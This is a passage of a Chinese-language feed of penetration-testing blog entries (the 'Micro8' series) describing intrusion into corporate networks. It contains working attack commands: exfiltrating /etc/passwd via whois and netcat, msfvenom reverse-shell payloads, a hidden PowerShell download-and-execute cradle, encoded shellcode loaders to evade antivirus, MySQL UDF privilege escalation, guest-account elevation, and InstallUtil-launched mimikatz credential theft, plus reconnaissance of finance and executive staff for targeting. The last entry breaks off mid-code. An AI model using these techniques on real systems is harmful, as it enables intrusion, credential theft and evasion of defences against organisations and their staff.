        <content type="html"><![CDATA[<p>利用whois传输文件：</p><p>传输机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`</span><br></pre></td></tr></table></figure><p>接受机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@john:/tmp# nc -l -v -p 4444 | sed &quot;s/ //g&quot; | base64 -d</span><br></pre></td></tr></table></figure><p><img src="../do/media/cd6ba6694ef1388b87dc4a5ce706ecd8.jpg" alt></p><p><img src="../do/media/2ee55e5bed9e117f9340df1f2e755410.jpg" alt>  </p><p><strong>优点：</strong>适用于隐蔽传输。最小化被发现。<br><strong>缺点：</strong>适用于传输小文件。</p><blockquote><p>  后者的话：whois是否同样适用于payload的反弹，是一个非常有趣的实验。  </p><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>52、渗透的本质是信息搜集</title>
      <link href="/article/52_%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html"/>
      <url>/article/52_%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>  目标资产信息搜集的程度，决定渗透过程的复杂程度。</p></blockquote><blockquote><p>  目标主机信息搜集的深度，决定后渗透权限持续把控。</p></blockquote><blockquote><p>  渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。</p></blockquote><blockquote><p>  —-Micropoor</p></blockquote><p>文章将连载，从几方面论证，<strong>渗透的本质是信息搜集</strong>。</p><p>一次完整的网络渗透，不仅仅是与目标管理人员的权限争夺，一次完整的网络渗透，它分为两大块，<strong>技术业务</strong>与<strong>信息分析业务</strong>。</p><p>而<strong>技术业务要辅助并且要为信息分析业务提供强大的支撑与保证</strong>。同时<strong>信息分析业务要为技术业务提供关键的目标信息分析逻辑关系与渗透方向</strong>。</p><p>案例如下：(非root/administrator下主动信息搜集)（有马赛克）</p><p>在得到一个webshell时，非root/administrator情况下对目标信息搜集至关重要，它会影响后期的渗透是否顺利，以及渗透方向。</p><p>目标主机分配了2个内网IP，分别为 10.0.0.X 与 192.168.100.X<br><img src="../do/media/8662257637ef2af4586f753a113dae25.jpg" alt></p><p>得知部分服务软件，以及杀毒软件 NOD32，一般内网中为杀毒为集体一致。</p><p><img src="../do/media/648cf924f838838a640e5d845c6b0a26.jpg" alt></p><p>搜集补丁更新频率，以及系统状况<br><img src="../do/media/bf97b8416a0bb48ff30263a02da4c80b.jpg" alt></p><p>搜集安装软件以及版本，路径等。  </p><p><img src="../do/media/300fe596787c9c2cbebd471591629f6b.jpg" alt>  </p><p><img src="../do/media/caae57861800df2ea13d2677b2ac8a1c.jpg" alt></p><p>域中用户如下。目前权限为 iis apppool\xxxx  </p><p><img src="../do/media/71d9d6527589b430f48a7ca0a1efdce2.jpg" alt></p><p>正如上面所说，技术业务需要辅助分析业务。在域组中，其中有几个组需要特别关注，在一般的大型内网渗透中，需要关注大致几个组</p><p><strong>（1）IT组/研发组</strong> 他们掌握在大量的内网密码，数据库密码等。<br><strong>（2）秘书组</strong> 他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业务来确定渗透方向<br><strong>（3）domain admins组</strong> root/administrator<br><strong>（4）财务组</strong>  他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组织的整体架构<br><strong>（5）CXX组</strong> ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。  </p><p><img src="../do/media/fcb0d45dbf09c50adbf473f85fb468c0.jpg" alt></p><p>以研发中心为例：研发中心共计4人。</p><p><strong>并且开始规划信息刺探等级：</strong></p><p><strong>等级1：</strong>确定某部门具体人员数量 如研发中心4人<br><strong>等级2：</strong>确定该部门的英文用户名的具体信息，如姓名，联系方式，邮箱，职务等。以便确定下一步攻击方向<br><strong>等级3：</strong>分别刺探白天/夜间  内网中所存活机器并且对应IP地址<br><strong>等级4：</strong> 对应人员的工作机内网IP，以及工作时间<br><strong>等级5：</strong> 根据信息业务反馈，制定目标安全时间，以便拖拽指定人员文件，或登录目标机器<br><strong>等级6：</strong> 制定目标机器后渗透与持续渗透的方式以及后门</p><h3 id="刺探等级1"><a href="#刺探等级1" class="headerlink" title="刺探等级1"></a>刺探等级1</h3><p><img src="../do/media/cc9a229d319f91d109bd7a84874fa341.jpg" alt></p><h3 id="刺探等级2"><a href="#刺探等级2" class="headerlink" title="刺探等级2"></a>刺探等级2</h3><p><img src="../do/media/5305a8890be45902aacb107373c3a046.jpg" alt></p><p><img src="../do/media/35fed4bbfade4243fb017db7c199822f.jpg" alt></p><p>在 net user /domain 后得到域中用户，但需要在<strong>非root/administrator</strong>权限下得到更多的信息来给信息分析业务提供数据，并确定攻击方向。</p><p>在案例中针对 nod32，采用 powershell payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx</span><br><span class="line">LPORT=xx -f psh-reflection &gt; xx.ps1</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost xxx.xxx.xxx.xxx lhost =&gt; xxx.xxx.xxx.xxx</span><br><span class="line">msf exploit(handler) &gt; set lport xxx lport =&gt; xxx</span><br><span class="line">msf &gt; run</span><br><span class="line"></span><br><span class="line">powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-ObjectNet.WebClient).DownloadString(&apos;http://xxx.xxx.xxx.xxx/xxx.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure><p>注意区分目标及系统是32位还是64位。  </p><p><img src="../do/media/65937ec4401b9b85a2a7280e6e8b1e14.jpg" alt>  </p><p><img src="../do/media/98463d3aa553b77e77a057eae6a3f57c.jpg" alt>  </p><p><img src="../do/media/6ef6fb36515c9ab57e0e38a24e2fc809.jpg" alt>  </p><p><img src="../do/media/2b7fd17d2d1c8c1ffd13134ce502c1b5.jpg" alt>  </p><p><img src="../do/media/627f7d0b2cf780725115a7eaa1dfb01b.jpg" alt></p><p>接下来将会用 IIS APPPOOL\XXXX 的权限来搜集更多有趣的信息  </p><p><img src="../do/media/50409d7054b3842df85370c03b4c88f8.jpg" alt></p><p>某数据库配置 for mssql  </p><p><img src="../do/media/474c1c2549316bbf317fa0ee1be8c461.jpg" alt>  </p><p><img src="../do/media/7f942b8a47046f622a76c9fcfa17131e.jpg" alt></p><p>白天测试段10.0.0.x段在线主机 for windows （部分）  </p><p><img src="../do/media/c1dc05330e082caae0c6895ac1c1abcb.jpg" alt></p><h3 id="10-0-0-x-段信息刺探："><a href="#10-0-0-x-段信息刺探：" class="headerlink" title="10.0.0.x 段信息刺探："></a>10.0.0.x 段信息刺探：</h3><p>IP 1-50 open 3389 （部分）  </p><p><img src="../do/media/04045975dcc3d3b9aacfe9ed44cc8a45.jpg" alt>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.0.0.2: - 10.0.0.2:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.3: - 10.0.0.3:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.5: - 10.0.0.5:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.7: - 10.0.0.7:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.9: - 10.0.0.9:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.12: - 10.0.0.12:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.13: - 10.0.0.13:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.14: - 10.0.0.14:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.26: - 10.0.0.26:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.28: - 10.0.0.28:3389 - TCP OPEN</span><br><span class="line">[+] 10.0.0.32: - 10.0.0.32:3389 - TCP OPEN</span><br></pre></td></tr></table></figure><p>IP 1-255 open 22,25 （部分）  </p><p><img src="../do/media/d75d26fbe0f7bf91da3fe7db65c58c76.jpg" alt>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.0.0.3: - 10.0.0.3:25 - TCP OPEN</span><br><span class="line">[+] 10.0.0.5: - 10.0.0.5:25 - TCP OPEN</span><br><span class="line">[+] 10.0.0.14: - 10.0.0.14:25 - TCP OPEN</span><br><span class="line">[+] 10.0.0.15: - 10.0.0.15:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.16: - 10.0.0.16:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.17: - 10.0.0.17:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.20: - 10.0.0.20:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.21: - 10.0.0.21:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.31: - 10.0.0.31:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.38: - 10.0.0.38:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.40: - 10.0.0.40:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.99: - 10.0.0.99:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.251: - 10.0.0.251:22 - TCP OPEN</span><br><span class="line">[+] 10.0.0.254: - 10.0.0.254:22 - TCP OPEN</span><br></pre></td></tr></table></figure><p>IP 1-255 smtp for version （部分）  </p><p><img src="../do/media/9c33b4d83946e383cce75062f50138cd.jpg" alt>  </p><pre><code class="code">msf auxiliary(smtp_version) \&gt; run[+] 10.0.0.3:25 - 10.0.0.3:25 SMTP 220 xxxxxxxxxxxxxxxxx MAIL Service,Version: 7.5.7601.17514 ready at Wed, 14 Feb 2018 18:28:44 +0800 \\x0d\\x0a[+] 10.0.0.5:25 - 10.0.0.5:25 SMTP 220 xxxxxxxxxxxxxxxxx Microsoft ESMTP MAIL Service, Version: 7.5.7601.17514 ready at Wed, 14 Feb 2018 18:29:05 +0800 \\x0d\\x0a[+] 10.0.0.14:25 - 10.0.0.14:25 SMTP 220 xxxxxxxxxxxxxxxxxt ESMTP MAIL Service, Version: 7.0.6002.18264 ready at Wed, 14 Feb 2018 18:30:32 +0800 \\x0d\\x0a</code></pre><p><img src="../do/media/aa86c13c60cfabb912e9f7bdf7517ccf.jpg" alt></p><p>在iis apppool\xxxx的权限下，目前得知该目标内网分配段，安装软件，杀毒，端口，服务，补丁更新频率，管理员上线操作时间段，数据库配置信息，域用户详细信息（英文user对应的职务，姓名等），以上数据等待信息分析业务，来确定攻击方向。如财务组，如cxx组等。并且完成了<strong>刺探等级1-4</strong></p><p>而在以上的信息搜集过程中，提权不在是我考虑的问题了，可以Filezilla server提权，mssqsl数据库提权，win03提权，win2000提权，win08提权，iis.x提权，内网映射提权等。而现在需要做的是如何反制被发现来制定目标业务后门，以便长期控制。</p><p>下一季的连载，将会从三方面来讲述大型内网的信息刺探，既有0day的admin权限下刺探，无提权下的guest/users权限下刺探。数据库下的权限刺探。域权限延伸到办公PC机的信息刺探。以及只有路由权限下的信息刺探。原来在渗透过程中，提权是次要的，信息刺探才是渗透的本质。  </p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>51、项目回忆：体系的本质是知识点串联</title>
      <link href="/article/51_%E9%A1%B9%E7%9B%AE%E5%9B%9E%E5%BF%86%EF%BC%9A%E4%BD%93%E7%B3%BB%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%B2%E8%81%94.html"/>
      <url>/article/51_%E9%A1%B9%E7%9B%AE%E5%9B%9E%E5%BF%86%EF%BC%9A%E4%BD%93%E7%B3%BB%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%B2%E8%81%94.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>一次普通的项目，做完后，却陈思很久，遂打算一气合成把整个流程记录下来，此篇再一次的叮嘱我：分享便是我最好的老师。<br>Micropoor</p></blockquote><p>拿shell过程略过。（由于文章在项目实施结束形成，故部分无图或补图）</p><hr><h3 id="目标机背景："><a href="#目标机背景：" class="headerlink" title="目标机背景："></a>目标机背景：</h3><p>windows 2008 r2 x64位 360主动 + 360卫士 + 360杀毒 + waf，目标机仅支持 aspx。运行 OAWeb 服务（.net+mssql），并且是内网中其他服务器的数据库服务器（mysql 数据库，不支持 php，无 .net for mysql 驱动）</p><p><img src="../do/media/7aa1856e57ac0ef987a329b1b89a4524.jpg" alt></p><h3 id="端口开放如下："><a href="#端口开放如下：" class="headerlink" title="端口开放如下："></a>端口开放如下：</h3><p><img src="../do/media/d599b0029b2b161bc950e73a1c40b841.jpg" alt></p><h3 id="需要解决的第一个问题：payload"><a href="#需要解决的第一个问题：payload" class="headerlink" title="需要解决的第一个问题：payload"></a>需要解决的第一个问题：payload</h3><p>由于目标机，安装某套装，payload 一定是必须要解决的问题。当 tasklist 的时候，看到如下图几个进程的时候，第一反应就是需要做 payload 分离免杀。分离免杀主要分两大类，一类为第三方分离免杀，一类为自带安装分离免杀。文章中，采取了第三方分离免杀。  </p><p><img src="../do/media/d2673aa4f5b1e77887ad446a0fdb2ec4.jpg" alt></p><h3 id="本地补图（由于项目在实施后形成该文章，故本地靶机补图）"><a href="#本地补图（由于项目在实施后形成该文章，故本地靶机补图）" class="headerlink" title="本地补图（由于项目在实施后形成该文章，故本地靶机补图）"></a>本地补图（由于项目在实施后形成该文章，故本地靶机补图）</h3><p>目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。无论是哪种，都是特别针对PE头文件的查杀。尤其是当payload文件越大的时候，特征越容易查杀。  </p><p>既然知道了目前的主流查杀方式，那么反制查杀，此篇采取特征与行为分离免杀。避免PE头文件，并且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于windows下为了更稳定的一种常用手法。载入内存。</p><h3 id="0x00-以msf为例：监听端口"><a href="#0x00-以msf为例：监听端口" class="headerlink" title="0x00:以msf为例：监听端口"></a>0x00:以msf为例：监听端口</h3><p><img src="../do/media/19dfebd9ab71a4e0c11ac47a082a5d7a.jpg" alt></p><h3 id="0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为："><a href="#0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：" class="headerlink" title="0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为："></a>0x01：这里的payload不采取生成pe文件，而采取shellcode方式，来借助第三方直接加载到内存中。避免行为：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.5 lport=8080 -e x86/shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure><p><img src="../do/media/1a912494f05f8ca99edf268225e1a66f.jpg" alt></p><h3 id="0x02-既然是shellcode方式的payload，那么需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源："><a href="#0x02-既然是shellcode方式的payload，那么需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源：" class="headerlink" title="0x02:既然是shellcode方式的payload，那么需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源："></a>0x02:既然是shellcode方式的payload，那么需要借助第三方来启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用一个github一个开源：</h3><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a>  </p><blockquote><p>  作者的话：建议大家自己写shellcode执行盒，相关代码网上非常成熟。</p></blockquote><p><img src="../do/media/8b5a85a36c75eb412d5938adcb9c07f8.jpg" alt>  </p><p>生成的payload大小如下：476字节。  </p><p><img src="../do/media/f4ca74ee9eebe883fdf665a892e0b058.jpg" alt></p><p>世界杀毒网：<br><img src="../do/media/663bc4d955c71bf9882c9a31761e0c14.jpg" alt></p><p>上线成功。<br><img src="../do/media/be28c1202684af6369757b813f4d9649.jpg" alt>  </p><p>而关于自带安装分离免杀，请参考我在公司 Wiki 上写的第六十九课时 <strong>payload分离免杀思路第二季</strong>  </p><p>payload 反弹到 vps 的 msf 上，我的权限仅仅如下。<br><img src="../do/media/19694da12bf09c5a567986db01872863.jpg" alt></p><h3 id="需要解决的第二个问题：提权"><a href="#需要解决的第二个问题：提权" class="headerlink" title="需要解决的第二个问题：提权"></a>需要解决的第二个问题：提权</h3><p>参考主机背景图，184个补丁，以及某套装。遂放弃了exp提权。  </p><ul><li>原因1：需要更多的时间消耗在对反病毒软件对抗。  </li><li>原因2：目标机补丁过多。需要消耗更多的时间  </li><li>原因3：非常艰难的环境下，拿到了权限，不想因为某些exp导致蓝屏从而丢失权限。</li></ul><p>开始翻阅目标机上的文件，以及搜集目标机的端口，服务，启动等一系列信息。发现目标机安装mysql，并与内网其中一台建立大量连接。mysql版本为5.1.49-community-log</p><p>下载目标机*..MYI，*.MYD，*.frm，加载于本地mysql。得到目标机root密码<br><img src="../do/media/6344f895e12122941c872ea7ec30e968.jpg" alt></p><p>而目标机没有相关脚本环境连接mysql，到这里，可以有2个方向针对该问题作出解决  </p><ul><li>一：转发目标机端口到本地，从而操作mysql。  </li><li>二：在非交互式下，完成mysql udf的提权。</li></ul><p>为了减少目标主机的流量探测，以及维护来之不易的session，故选择了第二种方案。非交互式下，mysql提权。</p><p>命令行下，调用mysql是需要在启动一个mysql窗口，从而继续执行，而session下没有这样的条件。但mysql的 -e 参数 作为直接执行sql语句，从而不另启动窗口。而-e需要注意的事项，use database。</p><p>也就是所有参数需要mysql.xxxx<br><img src="../do/media/8ebbf18b920c921b26d200c0764b0e51.jpg" alt>  </p><p>如没有指定database，将会出现如下错误，而使用UNION，将不会有回显，一定出现问题，将会很难定位，故选择以mysql.x的方式指定。</p><p><img src="../do/media/d66e6280c230d7df5594034f2b120506.jpg" alt></p><p>大致流程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pXXXXXX -e &quot;create table mysql.a (cmd LONGBLOB);&quot; </span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;insert into mysql.a (cmd) values (hex(load_file(&apos;D:\\XXXXXXXXXX\\mysql5\\lib\\plugin\\u.dll&apos;)));&quot;</span><br><span class="line">mysql -u root -pXXXXXX -e &quot;SELECT unhex(cmd) FROM mysql.a INTO DUMPFILE &apos;D:/XXXXXXXXXX/mysql5/lib/plugin/uu.dll&apos;;&quot;</span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &apos;uu.dll&apos;&quot; </span><br><span class="line">mysql -uroot -pXXXXXX -e &quot;select shell(&apos;cmd&apos;,&apos;whoami&apos;);&quot;</span><br></pre></td></tr></table></figure><p><img src="../do/media/9937c23b9e70b9cdd717edaf8872424c.jpg" alt></p><h3 id="需要解决的第三个问题：登录服务器"><a href="#需要解决的第三个问题：登录服务器" class="headerlink" title="需要解决的第三个问题：登录服务器"></a>需要解决的第三个问题：登录服务器</h3><p>在有套装的环境下，默认拦截cmd下加帐号，而目前又无法抓取系统登录明文。mimikatz被查杀。cmd下调用powershell被拦截。遂选择激活guest帐号，并提升到administrators组，来临时登录目标机。<br><img src="../do/media/4eb174d39dbe43bc7d4428629d5398b0.jpg" alt></p><p><img src="../do/media/3455e7d1c707e61e18e8addd6e9cf92f.jpg" alt></p><h3 id="socks代理登录目标机："><a href="#socks代理登录目标机：" class="headerlink" title="socks代理登录目标机："></a>socks代理登录目标机：</h3><p><img src="../do/media/071c738c001832dabeda3cf1474eb585.jpg" alt></p><h3 id="需要解决的第四个问题：抓取目标机明文密码"><a href="#需要解决的第四个问题：抓取目标机明文密码" class="headerlink" title="需要解决的第四个问题：抓取目标机明文密码"></a>需要解决的第四个问题：抓取目标机明文密码</h3><p>登录服务器后，目前依然不知道目标机的密码。这里有两种方向来解决该问题。  </p><ul><li>一：关闭我能关闭的套装，由于管理员没有注销登录。能关闭的有限。  </li><li>二：分离免杀做mimikatz密码抓取</li></ul><p>作者选择了第二种方案：</p><p>这里需要用到<strong>csc.exe，与InstallUtil.exe</strong></p><p>关于两个文件默认安装位置：（注意x32，x64区别）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\</span><br></pre></td></tr></table></figure><p>分别执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe /keyfile:C:\Users\Johnn\Desktop\installutil.snk /unsafe</span><br><span class="line">C:\Users\Johnn\Desktop\mimi.cs</span><br><span class="line"></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Johnn\Desktop\Micropoor.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/18d0d45533111eb2d484ea1d82de9468.jpg" alt></p><p><img src="../do/media/69b5325b911756ed887ffd19523ae927.jpg" alt></p><h3 id="派生出的第五个问题：横向渗透"><a href="#派生出的第五个问题：横向渗透" class="headerlink" title="派生出的第五个问题：横向渗透"></a>派生出的第五个问题：横向渗透</h3><p>关于第五个问题，本意并不是该篇幅所要讲述的，后续是搜集目标机的mssql，mysql，rdp 密码。搜集所在内网的拓扑，来辅助本次的横向扩展。便完成了本次的项目。<br>如需具体，请参考我在Wiki上的系列教程78，79，12，13，71课时。  </p><p><img src="../do/media/eccebe5ce07798d977d07e4c3c0d6e8b.jpg" alt></p><blockquote><p>后者的话：<br>本次的整个流程，并没有遇到太多的问题，仅仅是把几个知识点的串联起来，形成的一个完整的渗透。也许你了解知识点1，也了解知识点2，还了解知识点3等等。但是一次完整的项目是离不开每一个知识点的串联与灵活运用。这应该是每一个信息安全从业人员值得思考的问题。</p></blockquote><p><strong>在每次分享的同时，深深发现，原来分享，才是我最好的老师。</strong></p><blockquote><p>Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>50、基于SqlDataSourceEnumerator发现内网存活主机</title>
      <link href="/article/50_%E5%9F%BA%E4%BA%8ESqlDataSourceEnumerator%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html"/>
      <url>/article/50_%E5%9F%BA%E4%BA%8ESqlDataSourceEnumerator%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA.html</url>
      
        <content type="html"><![CDATA[<p>从 xp 开始默认有 .net framework,在 powershell 后，调用起来更方便。</p><h3 id="连载1"><a href="#连载1" class="headerlink" title="连载1"></a>连载1</h3><p>System.Data.SqlClient 命名空间是用于 SQL Server 的 .NET 数据提供程序。在net framework2.0中新增加SqlDataSourceEnumerator 类。提供了一种枚举本地网络内的所有可用 SQL Server 实例机制。微软官方是这样解释的：</p><blockquote><p>  SQL Server 2000 和 SQL Server 2005 进行应用程序可以确定在当前网络中的 SQL Server实例存在。SqlDataSourceEnumerator类公开给应用程序开发人员，提供此信息DataTable包含所有可用的服务器的信息。返回此表列出了与列表匹配提供当用户尝试创建新的连接的服务器实例以及Connection Properties对话框中，展开下拉列表，其中包含所有可用的服务器。</p></blockquote><pre><code class="code">PowerShell -Command &quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot;</code></pre><p><img src="../do/media/56279a8ac03519b94850df0f82c9835a.jpg" alt></p><p><img src="../do/media/cfcaa6274999ba01237a3d0265ed7b45.jpg" alt></p><p>此种方法，在实战中，不留文件痕迹。并且信息准确，发现主机也可。可应对目前主流安全防御产品。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>49、关于Powershell对抗安全软件</title>
      <link href="/article/49_%E5%85%B3%E4%BA%8EPowershell%E5%AF%B9%E6%8A%97%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6.html"/>
      <url>/article/49_%E5%85%B3%E4%BA%8EPowershell%E5%AF%B9%E6%8A%97%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6.html</url>
      
        <content type="html"><![CDATA[<p><strong>知识点介绍：</strong></p><p>Windows PowerShell是以.NET Framework技术为基础，并且与现有的WSH保持向后兼容，因此它的脚本程序不仅能访问.NET CLR，也能使用现有的COM技术。同时也包含了数种系统管理工具、简易且一致的语法，提升管理者处理，常见如登录数据库、WMI。Exchange Server 2007以及System Center Operations Manager 2007等服务器软件都将内置Windows PowerShell。Windows PowerShell的强大，并且内置，在渗透过程中，也让渗透变得更加有趣。而安全软件的对抗查杀也逐渐开始针对powershell的一切行为。在 <a href="https://technet.microsoft.com，看到文档如下：" target="_blank" rel="noopener">https://technet.microsoft.com，看到文档如下：</a></p><blockquote><p>  Here is a listing of the available startup parameters:<br>-Command Specifies the command text to execute as though it were typed at the PowerShell command prompt.<br>-EncodedCommand Specifies the base64-encoded command text to execute.<br>-ExecutionPolicy Sets the default execution policy for the console session.<br>-File Sets the name of a script file to execute.<br>-InputFormat Sets the format for data sent to PowerShell as either text string or serialized XML. The default format is XML. Valid values are text and XML.<br>-NoExit Does not exit after running startup commands. This parameter is useful when you run PowerShell commands or scripts via the command prompt(cmd.exe).<br>-NoLogo Starts the PowerShell console without displaying the copyright banner.<br>-Noninteractive Starts the PowerShell console in non-interactive mode. In this mode, PowerShell does not present an interactive prompt to the user.<br>-NoProfile Tells the PowerShell console not to load the current user’s profile.<br>-OutputFormat Sets the format for output as either text string or serialized XML. The default format is text. Valid values are text and XML.<br>-PSConsoleFile Loads the specified Windows PowerShell console file. Console files end with the .psc1 extension and can be used to ensure that specific snap-in extensions are loaded and available. You can create a console file using Export-Console in Windows PowerShell.<br>-Sta Starts PowerShell in single-threaded mode.<br>-Version Sets the version of Windows PowerShell to use for compatibility,such as 1.0.<br>-WindowStyle Sets the window style as Normal, Minimized, Maximized, or Hidden. The default is Normal.</p></blockquote><p>针对它的特性，本地测试：</p><blockquote><p>Add-Type -AssemblyName PresentationFramework;<br>[System.Windows.MessageBox]::Show(‘Micropoor’)</p></blockquote><p><img src="../do/media/faf8154c646ab4aa837ebb8d5d99ae78.jpg" alt></p><p><img src="../do/media/e1f2fb4edc10e83ae5f2c2f51d6ead38.jpg" alt></p><p>上文所说，越来越多的杀软开始对抗，powershell的部分行为，或者特征。以msfvenom为例，生成payload。<br><img src="../do/media/7eec22528d589cc79d6af609182206e7.jpg" alt></p><p>micropoor.ps1不幸被杀。<br><img src="../do/media/90aeb138701d59ba01c5497d2c9d978e.jpg" alt></p><p>针对powershell特性，更改payload<br><img src="../do/media/12ee496efb54f3670b111d3be3cde056.jpg" alt></p><p><img src="../do/media/55da22835d354321eba9b36ebf36128d.jpg" alt></p><p>接下来考虑的事情是如何把以上重复的工作变成自动化，并且针对powershell，DownloadString特性，设计出2种payload形式：<br>（1）目标机出网<br>（2）目标机不出网</p><p>并且根据需求，无缝连接Metasploit。</p><p>根据微软文档，可以找到可能对以上有帮助的属性，分别为：  </p><ul><li>Window  </li><li>Style  </li><li>NoExit EncodedCommand  </li><li>exec</li></ul><p>自动化实现如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 